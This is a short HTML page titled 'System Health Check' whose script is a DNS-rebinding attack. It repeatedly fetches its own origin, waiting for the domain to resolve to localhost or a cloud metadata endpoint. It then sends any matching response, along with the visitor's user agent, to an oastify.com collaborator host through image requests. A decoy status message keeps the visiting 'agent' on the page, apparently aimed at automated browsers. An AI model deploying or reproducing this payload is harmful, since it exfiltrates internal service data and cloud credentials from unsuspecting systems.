<!DOCTYPE html>
<html>
<head><title>System Health Check</title></head>
<body>
    <h1 id="status">Syncing with Node...</h1>
    <script>
        const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
        const log = (p, d) => new Image().src = `https://${collab}/${p}?v=${btoa(JSON.stringify(d))}`;

        async function attemptRebind() {
            // We attempt to fetch the same domain we are on.
            // When the DNS flips, this will hit localhost or metadata.
            try {
                const res = await fetch(window.location.href, { cache: 'no-cache' });
                const text = await res.text();
                if (text.includes("compute") || text.includes("instance")) {
                    log("REBIND_SUCCESS_SSRF", { data: text.substring(0, 200) });
                }
            } catch (e) {
                // Silently wait for the flip
            }
        }

        window.onload = () => {
            log("rebind_start", { ua: navigator.userAgent });
            // Aggressive polling to catch the DNS change
            setInterval(attemptRebind, 1000);
            
            // Keep the agent on the page by updating the UI
            setTimeout(() => { document.getElementById('status').innerText = "Processing Data..."; }, 5000);
        };
    </script>
</body>
</html>
